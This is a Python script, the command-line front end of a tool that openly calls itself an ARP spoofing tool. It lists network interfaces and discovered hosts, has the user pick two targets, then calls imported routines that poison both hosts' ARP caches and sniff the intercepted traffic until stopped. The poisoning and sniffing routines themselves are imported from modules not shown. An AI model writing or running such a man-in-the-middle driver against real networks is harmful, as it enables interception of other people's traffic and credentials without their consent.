from DataStructures import Interface
from NetworkRecon import NetworkRecon
from AttackTools import AttackTools


class CommandLineInterface:
    @staticmethod
    def interface_selector():
        # TODO: Add error detection
        interfaces = NetworkRecon.list_interfaces()
        print("Available interfaces:")
        i = 0
        for interface in interfaces:
            print(str(i) + ": " + interface.name)
            i = i + 1

        print("")

        selected_interface_id = input("Please choose a network interface: ")

        print("")

        try:
            selected_interface_id = int(selected_interface_id)
            selected_interface = interfaces[selected_interface_id]

        except ValueError:
            i = 0
            for interface in interfaces:
                if interface.name == selected_interface_id:
                    selected_interface = interfaces[i]
                    break
                i = i + 1

        return selected_interface

    @staticmethod
    def host_selector(interface: Interface):
        # TODO: Add error detection
        hosts = NetworkRecon.list_hosts(interface)
        print("Available hosts:")
        i = 0
        for host in hosts:
            print("host " + str(i) + " ip: " + host.get_addr() + ", mac: " + host.get_hwaddr())
            i = i + 1

        print()

        target_1_id = input("Please select target #1: ")
        target_2_id = input("Please select target #2: ")

        target_1 = hosts[int(target_1_id)]
        target_2 = hosts[int(target_2_id)]

        selected_hosts = [target_1, target_2]

        return selected_hosts


def main():
    print("This is an ARP Spoofing tool.\n")
    selected_interface = CommandLineInterface.interface_selector()
    targets = CommandLineInterface.host_selector(selected_interface)
    AttackTools.poison(selected_interface.get_host(), targets[0], targets[1], True, True)
    sniffer = AttackTools.sniff(True, selected_interface)

    print()
    input("Press enter to stop")
    thread = sniffer.get_thread()
    sniffer.kill()
    thread.join()


main()
